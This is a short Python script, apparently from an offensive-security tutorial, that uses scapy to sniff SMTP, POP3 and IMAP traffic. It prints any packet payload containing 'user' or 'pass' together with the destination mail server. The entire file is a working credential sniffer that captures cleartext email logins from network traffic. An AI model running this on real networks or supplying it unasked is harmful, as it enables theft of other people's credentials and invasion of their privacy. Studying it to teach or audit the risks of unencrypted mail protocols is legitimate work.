from scapy.all import *

def packet_callback(pkt):
	if pkt[TCP].payload:
		mail_packet = str(pkt[TCP].payload)

		if "user" in mail_packet.lower() or "pass" in mail_packet.lower():
			print "[*] Server: %s" %pkt[IP].dst

			print "[*] %s"  %pkt[TCP].payload

sniff(filter="tcp port 25 or tcp port 110 or tcp port 143", prn=packet_callback, store=0)